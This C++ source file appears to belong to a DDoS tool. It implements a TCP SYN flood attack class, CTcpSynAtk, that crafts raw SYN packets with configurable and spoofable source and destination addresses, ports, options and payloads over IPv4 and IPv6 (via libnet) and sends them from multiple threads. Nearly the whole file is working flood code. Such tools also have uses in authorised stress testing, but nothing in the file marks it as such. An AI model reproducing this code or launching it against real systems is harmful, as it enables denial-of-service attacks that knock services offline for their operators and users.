#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "pktbuild.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CTcpSynAtk.h"
#include <libnet.h>


int32_t CTcpSynAtk::attack_one_pkt(int thrd_index) 
{
	pdu_l3_desc_t layer3 = get_layer3_info();

    if(m_params.m_ip_type== IP_V4){
    	
    	int pkt_len = modify_tcp_syn(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN,NULL);
		sendpkt(layer3.dstaddr, layer3.dport,  pkt_len,  thrd_index);
	}else{
        int c = 0;
		if(layer3.tcpoptionflag!=0){
			 libnet_build_tcp_options((uint8_t*)layer3.tcpoptions,layer3.tcpoptionflag,m_libnet,0);
		}
		 
		 libnet_build_tcp(layer3.sport ,
						 layer3.dport,
						 libnet_get_prand(LIBNET_PRu32),/*seq*/
						 libnet_get_prand(LIBNET_PRu32),/*ack*/
						 TH_SYN, 
						 libnet_get_prand(LIBNET_PRu16),/*win*/
						 0, /*sum*/
						 0, /*urg*/
						 LIBNET_TCP_H,/*len*/
						 (uint8_t*)m_params.m_payload_data,
						 m_params.m_payload_len, 
						 m_libnet,
						 0);
		 //printf("\n t=%d\n",t);
		 libnet_build_ipv6(
			 0, 
			 0,
			 LIBNET_TCP_H+layer3.tcpoptionflag+m_params.m_payload_len,
			 IPPROTO_TCP, 
			 64, 
			 layer3.srcaddr6,
			 layer3.dstaddr6,
			 NULL, 
			 0, 
			 m_libnet, 
			 0);

		//printf("\n t=%d\n",t);
		/*libnet_build_ipv6(0, 0, LIBNET_TCP_H, IPPROTO_TCP, 64, src_ip, dst_ip,
				NULL, 0, m_libnet, 0);*/

        char srcname[255]={0};
		libnet_addr2name6_r( layer3.srcaddr6,1,srcname,255);
		char dstname[255]={0};
		libnet_addr2name6_r( layer3.dstaddr6,1,dstname,255);
		RC_LOG_INFO("%15s/%5d -> %15s/%5d\n", srcname,layer3.sport,dstname,layer3.dport);

		c = libnet_write(m_libnet);
		if (c == -1)
		{
			RC_LOG_ERROR("libnet_write: %s\n", libnet_geterror(m_libnet));
		}
		libnet_clear_packet(m_libnet);

	}

    return RC_OK;
}




pdu_l3_desc_t CTcpSynAtk::get_layer3_info(){

   pdu_l3_desc_t layer3;
   memset(&layer3, 0, sizeof(layer3));
   layer3.vlanid = m_params.m_vlan_id;
   layer3.dstaddr = get_cur_dstaddr();
   layer3.srcaddr = get_cur_srcaddr();
   layer3.dstaddr6 = get_cur_dstaddr6();
   layer3.srcaddr6 = get_cur_srcaddr6();	
   layer3.identity = m_params.m_identity;
   layer3.ttl = m_params.m_ttl;
   //layer3.tcpflag = 0x02;

   if (m_params.m_tcpflag == 0x10)
   {
	   layer3.tcpflag = 0x02;
	   
   }
   else
   {
	   layer3.tcpflag = m_params.m_tcpflag;
   }

   

   layer3.dont_frag = m_params.m_dont_frag;
   layer3.seq = get_cur_seq();
   layer3.ack = get_cur_ack();
   layer3.dport = get_cur_dstport();
   layer3.sport = get_cur_srcport();

   layer3.syn64 = m_params.m_issyn64;
   layer3.payload_len = m_params.m_payload_len;
   
   layer3.ip_type = m_params.m_ip_type;
   layer3.iph_proto = m_params.m_iph_proto;
   if(m_params.m_issyn64 != true)
       util_memcpy(layer3.tcpoptions,m_params.m_tcp_options, m_params.m_tcpoptionflag);
   //RC_LOG_INFO("m_params.m_tcpoptionflag,%d",m_params.m_tcpoptionflag);
   layer3.tcpoptionflag = m_params.m_tcpoptionflag;
   layer3.layer3_total_len = sizeof(TCP_HEADER_T) +m_params.m_payload_len+m_params.m_tcpoptionflag;

   return layer3;
}
int32_t CTcpSynAtk::start()
{
    uint32_t ii = 0;
    pdu_l3_desc_t layer3= get_layer3_info();
    for (ii = 0; ii < g_thrd_cnt; ii++)
    {
        m_fd[ii] = init_raw_tcp_socket();
        if (m_fd[ii] == -1)
        {
            return RC_ERROR;
        }
        if(m_params.m_ip_type ==  IP_V4){
        	m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
        	build_tcp_syn(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN,m_params.m_payload_data);
		}else{
			char errbuf[LIBNET_ERRBUF_SIZE];
			m_libnet= libnet_init(LIBNET_RAW6, /* injection type */
								NULL, /* network interface */
								errbuf); /* error buffer */
			if (m_libnet == NULL)
			{				
			
				RC_LOG_ERROR("libnet_init() failed: %s", errbuf);				
			
			}	
			libnet_seed_prand(m_libnet);

		}
    }

    return RC_OK;
}

void CTcpSynAtk::stop()
{
    common_free();
}


/**
s输入命令有 syn64 标志位 则生成报文无payload
如果payload不为空 则syn报文将填充payload
*/
uint32_t  CTcpSynAtk::build_tcp_syn(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload)
{
    uint32_t send_len = 0;
    IP_HEADER_T *iphdr = NULL;
    TCP_HEADER_T *tcphdr = NULL;

    if (buffer_len < (sizeof(IP_HEADER_T) + sizeof(TCP_HEADER_T) + sizeof(g_tcp_options) + pdu_desc->payload_len))
    {
        return (uint32_t)(-1);
    }
	send_len +=copy_ip_header( buffer,  buffer_len,   pdu_desc);
   /*
    iphdr = (IP_HEADER_T*)&buffer[0];
    iphdr->h_lenver=(4<<4 | sizeof(IP_HEADER_T)/4);
    iphdr->ident    = htons(pdu_desc->identity);
    if (pdu_desc->dont_frag)
        iphdr->frag_and_flags = htons(1 << 14);
    iphdr->ttl  = pdu_desc->ttl;
    iphdr->proto    = IPPROTO_TCP;
    iphdr->checksum = 0;
    iphdr->sourceIP = htonl(pdu_desc->srcaddr);
    iphdr->destIP   = htonl(pdu_desc->dstaddr);

    send_len += sizeof(IP_HEADER_T);*/

    tcphdr = (TCP_HEADER_T*)&buffer[send_len];
    tcphdr->th_sport    = htons(pdu_desc->sport);
    tcphdr->th_dport = htons(pdu_desc->dport);

    tcphdr->th_seq  = htonl(pdu_desc->seq);
    tcphdr->th_ack  = 0; //ack should be zero in syn
    tcphdr->th_flag = pdu_desc->tcpflag;
    tcphdr->th_win  = htons(16384);
    tcphdr->th_urp = 0;
    tcphdr->th_sum = 0;



    send_len += sizeof(TCP_HEADER_T);

    if (pdu_desc->syn64 == true)
    {
        //iphdr->total_len = htons(sizeof(IP_HEADER_T) + sizeof(TCP_HEADER_T) + pdu_desc->payload_len);
        tcphdr->th_lenres   = (sizeof(TCP_HEADER_T)/4)<<4;
    }
    else
    {
        //iphdr->total_len = htons(sizeof(IP_HEADER_T) + sizeof(TCP_HEADER_T) + sizeof(g_tcp_options) + pdu_desc->payload_len);
        tcphdr->th_lenres   = ((sizeof(TCP_HEADER_T) + pdu_desc->tcpoptionflag)/4)<<4 ;

        memcpy(&buffer[send_len], pdu_desc->tcpoptions, pdu_desc->tcpoptionflag);
        send_len +=  pdu_desc->tcpoptionflag;
    }

    if (pdu_desc->payload_len > 0 && pdu_desc->syn64 == false)
    {
        //util_memcpy(&buffer[send_len], payload, pdu_desc->payload_len);
        //加快速度,就用内存中的值

        if (payload != NULL)
        {
            util_memcpy(&buffer[send_len], payload, pdu_desc->payload_len);
        }
        else
        {
            /*payload不变*/
        }
		
        send_len +=  pdu_desc->payload_len;
    }
	iphdr = (IP_HEADER_T*)&buffer[0];
    tcphdr->th_sum = compute_tcp_checksum(iphdr, tcphdr, send_len - sizeof(IP_HEADER_T));
    return send_len;
}



//syn报文ack标志为0
//syn报文无payload
uint32_t CTcpSynAtk::modify_tcp_syn(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload)
{
    //int origin_len = 0;
	uint32_t send_len = 0;
    IP_HEADER_T *iphdr = NULL;
    TCP_HEADER_T *tcphdr = NULL;


	
	send_len+=copy_ip_header(buffer, buffer_len, pdu_desc);



    tcphdr = (TCP_HEADER_T*)&buffer[sizeof(IP_HEADER_T)];
    tcphdr->th_sport    = htons(pdu_desc->sport);
    tcphdr->th_dport = htons(pdu_desc->dport);
    tcphdr->th_seq  = htonl(pdu_desc->seq);
    tcphdr->th_ack  = 0; //ack should be zero in syn
    tcphdr->th_flag = pdu_desc->tcpflag;
    tcphdr->th_sum = 0;
	tcphdr->th_lenres   = ((sizeof(TCP_HEADER_T))/4<<4 | 0);



	send_len += sizeof(TCP_HEADER_T);

    if (pdu_desc->syn64 != true)
    {
        tcphdr->th_lenres   = ((sizeof(TCP_HEADER_T) + pdu_desc->tcpoptionflag)/4)<<4 ;
        memcpy(&buffer[send_len], pdu_desc->tcpoptions, pdu_desc->tcpoptionflag);
        send_len +=  pdu_desc->tcpoptionflag;
    }
	
	if (pdu_desc->payload_len > 0){
		 send_len +=  pdu_desc->payload_len;
	}

	iphdr = (IP_HEADER_T*)&buffer[0];
    tcphdr->th_sum = compute_tcp_checksum(iphdr, tcphdr, pdu_desc->layer3_total_len);
    return send_len;
}


